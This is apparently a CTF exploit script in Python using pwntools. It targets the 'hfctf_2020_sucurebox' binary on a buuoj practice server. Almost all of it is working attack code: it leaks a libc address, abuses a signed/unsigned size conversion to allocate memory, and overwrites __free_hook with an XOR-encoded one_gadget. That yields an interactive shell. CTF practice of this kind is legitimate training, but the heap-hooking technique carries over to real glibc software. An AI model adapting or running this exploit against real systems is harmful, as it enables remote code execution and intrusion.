# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './hfctf_2020_sucurebox'
os.system('chmod +x %s'%binary)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
DEBUG = 0
if DEBUG:
    libc = elf.libc
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm','-g','1234', binary])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '26369'
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
rint= lambda x = 12     : ras(int( p.recv(x) , 16))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('5.Exit',num)

def add(size):
    cmd(1)
    sla('Size:',size)
    return rkey()

def delete(idx):
    cmd(2)
    sla('ID: ',idx)

def edit(idx , offset , lenth , text):
    cmd(3)
    sla('ID: ',idx)
    sla('Offset of msg:',offset)
    sla('Len of msg:',lenth)
    sa('Msg:', text)

def show(idx , offset , lenth ):
    cmd(4)
    sla('ID: ',idx)
    sla('Offset of msg:',offset)
    sla('Len of msg:',lenth)

def tranLong(data):
    if data & 0x8000000000000000 != 0:
        return data - 0x10000000000000000
    else:
        return data

def rkey():
    ru('Key: \n')
    data = p.recvline().split(' ')
    key1 = '0x'
    key2 = '0x'
    for i in data[0:0x8][::-1]:
        key1 += i
    for i in data[0x8:0x10][::-1]:
        key2 += i
    return (eval(key1) , eval(key2))

one_gad = one_gadget(libc.path)

# 类型转化漏洞，另外 malloc_hook 的 ogg 不通可以试试 free_hook

def attack():
    
    add(0x418)
    add(0x108)
    delete(0)
    add(0x418)

    show(0 , 0 , 0x8)

    __malloc_hook = l64() - 0x70
    libc.address = __malloc_hook - libc.sym['__malloc_hook']
    system_addr = libc.sym['system']
    __free_hook = libc.sym['__free_hook']
    binsh_addr = libc.search('/bin/sh').next()
    ogg = one_gad[1] + libc.address
    realloc = libc.sym['realloc']

    lg('__free_hook',__free_hook)

    key = add(tranLong(0xFFFFFFFF00000FFF))
    # payload = flat('/bin/sh\x00' , system_addr)

    payload = p64(ogg ^ key[0])

    edit( 2 , __free_hook , 8 , payload )
    
    # dbg('free')
    delete(2)


    # dbg('malloc')
    # cmd(1)
    # sla('Size:',0x108)

    
    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   hfctf_2020_sucurebox.py
@Time    :   2022/02/04 18:24:59
@Author  :   Niyah 
'''